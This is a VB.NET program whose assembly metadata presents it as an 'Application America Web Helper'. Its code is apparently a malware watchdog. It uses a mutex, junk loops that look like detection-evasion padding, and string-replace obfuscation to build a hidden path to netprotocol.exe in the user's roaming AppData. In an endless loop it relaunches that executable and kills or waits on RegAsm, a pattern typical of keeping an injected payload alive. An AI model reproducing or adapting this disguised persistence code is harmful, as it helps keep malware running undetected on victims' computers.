Imports System.Reflection
Imports System.Text
Imports System.Security.Cryptography
Imports System.Security
Imports System.Diagnostics
Imports System.IO
Imports System.Net
Imports System.Collections
Imports System
Imports System.Threading
Imports System.Runtime.InteropServices
Imports System.Windows.Forms
Imports Microsoft.Win32
Imports Microsoft.VisualBasic
Imports System.CodeDom.Compiler
Imports System.Environment

<Assembly: AssemblyTitle("Web Application")> 
<Assembly: AssemblyDescription("Web Application")> 
<Assembly: AssemblyCompany("Application America")> 
<Assembly: AssemblyProduct("Application America Web Helper")> 
<Assembly: AssemblyCopyright("America (c) 2010-2016")> 
<Assembly: AssemblyTrademark("America (c) 2010-2016")> 
<Assembly: AssemblyVersion("1.1.2.4")> 
<Assembly: AssemblyFileVersion("1.1.2.4")> 

Module WebApplicationAmerica

    Private check As Mutex

    Public Sub checkifopen(ByVal mute As String)
        Try
            System.Threading.Mutex.OpenExisting(mute)
            End
        Catch ex As Exception
            check = New System.Threading.Mutex(False, mute)
            Exit Sub
        End Try
    End Sub

    Sub Main()

	MsgBox("A")

        checkifopen("843927423SGJSI")


        Do
            system.threading.thread.sleep(2000)
            AmericaApp()	
        Loop

    End Sub

    Private Sub AmericaApp()
	  Dim shit As Integer = 0
        Try
            Do
                shit = shit + 1
                shit = shit + 3
                shit = shit - 2
            Loop Until shit = 100000
            Dim crapper As Integer = 0
            '  Do

            Crapper += 1
            Dim shits As Integer = 1
            shits = shits + 5 + 5 + 2
            If crapper = 5000 Then
                crapper = crapper + 1 - 1
            End If

            shits += shits + crapper - 5
			catch
			end try
     

          Dim processz As New Process()
          processz.StartInfo.FileName = ret("US9ILE".Replace("9", "ERPROF")) & "\App1ming".Replace("1", "Data\Roa") & "*Microsoft*Windows*ScreenToGif*netprotocol.e3".Replace("3", "xe").Replace("*","\")
   
        If Process.GetProcessesByName("netprotocol").length > 0 Then
            ' Process is running
            '  System.Threading.Thread.Sleep(10)
        Else
            Try
                 Process.GetProcessesByName("RegAsm")(0).Kill()
            Catch
            End Try
		  Dim assassino As Integer = 4
                Do
                    assassino += 2
					if assassino = 5 + 6 - 10 then

					'processz.StartInfo.WindowStyle = assassino
					end if
                Loop Until assassino = 8
            processz.Start()

            Do Until Process.GetProcessesByName("RegAsm").Length > 0
                ' System.Threading.Thread.Sleep(10)
            Loop
        End If

        If Process.GetProcessesByName("RegAsm").length > 0 Then

        Else
            Try
                 Process.GetProcessesByName("netprotocol")(0).Kill()

            Catch
            End Try
            processz.Start()
            Do Until Process.GetProcessesByName("RegAsm").Length > 0
                '	System.Threading.Thread.Sleep(10)

            Loop
        End If
    End Sub

    Public Function ret(byval crap as string) As String
        Return "a".Replace("a", CStr(Environ(crap)))
    End Function
End Module